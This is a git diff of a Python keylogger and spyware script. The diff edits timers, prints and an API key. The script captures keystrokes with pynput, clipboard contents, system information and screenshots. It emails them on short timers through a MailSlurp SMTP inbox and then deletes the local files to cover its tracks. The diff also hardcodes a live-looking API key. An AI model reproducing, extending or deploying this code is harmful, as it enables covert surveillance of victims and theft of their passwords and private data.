@@ -17,7 +17,7 @@ from email.message import EmailMessage
 
 from os import access
 import mailslurp_client
-from requests import options
+
 from smtplib import SMTP
 
 import socket
@@ -26,7 +26,8 @@ import platform
 import win32clipboard
 
 from pynput.keyboard import Key, Listener
-
+from datetime import timedelta
+import time
 import os
 
 from cryptography.fernet import Fernet
@@ -77,7 +78,7 @@ def computer_information():
 computer_information()
 
 configuration = mailslurp_client.Configuration()
-configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
+configuration.api_key['x-api-key'] = "fbdbf61d452e5022e9e543585e0eebd76def5eb430dee3bbab51b94bd640961c" 
 with mailslurp_client.ApiClient(configuration) as api_client:
     # create an inbox
     inbox_controller = mailslurp_client.InboxControllerApi(api_client)
@@ -89,6 +90,7 @@ with mailslurp_client.ApiClient(configuration) as api_client:
     
 access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
 c=0
+p=1
 def send_log():
     with open(file_path+ extend + keys_information, 'rb') as f1,open(file_path+ extend +system_information, 'rb') as f2,open(file_path+ extend + clipboard_information, 'rb') as f3:
         file1_data=f1.read() 
@@ -99,7 +101,7 @@ def send_log():
         file3_data=f3.read() 
         file3_name=f3.name()
     #print(access_details)
-    #print("sending")
+    print("sending")
     with SMTP(
         host=access_details.smtp_server_host,
         port= access_details.smtp_server_port,
@@ -112,21 +114,23 @@ def send_log():
         smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
         smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
         smtp.quit()
-    #print("check your mail :)")
+    print("check your mail :)")
     c=c+1
     os.remove(file_path+ extend + keys_information)
     if c<1:
         os.remove(file_path+ extend +system_information)
     os.remove(file_path+ extend + clipboard_information) #deletes files
+   
 
 def send_img():
+    p=p+1
     screenshot()
     with open(file_path+ extend + screenshot_information, 'rb') as f4:
         file_data=f4.read() 
         file_name=f4.name
     
-    #print(access_details)
-    #print("sending")
+    print(access_details)
+    print("sending")
     with SMTP(
         host=access_details.smtp_server_host,
         port= access_details.smtp_server_port,
@@ -136,19 +140,24 @@ def send_img():
         smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
         smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
         smtp.quit()
-    #print("check your mail :)")
+    print("check your mail :)")
     os.remove(file_path+ extend + screenshot_information) #deletes png file
-    
-tlog = ResettableTimer(7200.0, send_log) #7200sec, 2hr
-timg= ResettableTimer(900,send_img) #900 seconds,ie 15 mins, can be changed 
-
-tlog.start()
-timg.start()
-start_time=time.time()
-while True:
-    if time.time()-start_time==90:
-        timg.reset()
-        timg.start()
-    if time.time()-start_time==720:
+    timg.reset()
+    timg.start()
+    if p%3==0:
         tlog.reset()
         tlog.start()
+    
+tlog = ResettableTimer(60.0, send_log) #7200sec, 2hr
+timg= ResettableTimer(30,send_img) #900 seconds,ie 15 mins, can be changed 
+
+# tlog.start()
+# timg.start()
+# start_time=time.time()
+# while True:
+#     if time.time()-start_time==900:
+#         timg.reset()
+#         timg.start()
+#     if time.time()-start_time==7200:
+#         tlog.reset()
+#         tlog.start()
